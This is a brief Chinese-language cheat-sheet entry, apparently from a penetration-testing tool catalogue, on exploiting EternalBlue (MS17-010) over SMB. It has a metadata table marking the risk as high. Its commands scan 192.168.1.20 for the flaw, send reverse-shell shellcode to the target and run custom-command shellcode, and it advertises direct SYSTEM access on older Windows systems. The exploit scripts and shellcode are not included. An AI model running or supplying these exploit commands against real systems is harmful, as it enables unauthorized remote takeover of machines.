### EternalBlue (MS17-010)

| 属性 | 值 |
|------|-----|
| 版本 | N/A |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `漏洞利用` `SMB` `RCE` |

## 永恒之蓝漏洞利用

### 检测目标是否存在漏洞
```bash
python3 zzz_checker.py 192.168.1.20
```

### 执行反弹 Shell 的 Shellcode
```bash
bash eternalblue_py.sh 192.168.1.20 sc_x64.bin
```

### 执行自定义命令的 Shellcode
```bash
bash eternalblue_py.sh 192.168.1.20 cmd_sc.bin
```

- ✓ 直接获取 SYSTEM 权限
- ✓ 支持 Windows 7/2008 等老旧系统
- 需自行准备 Shellcode
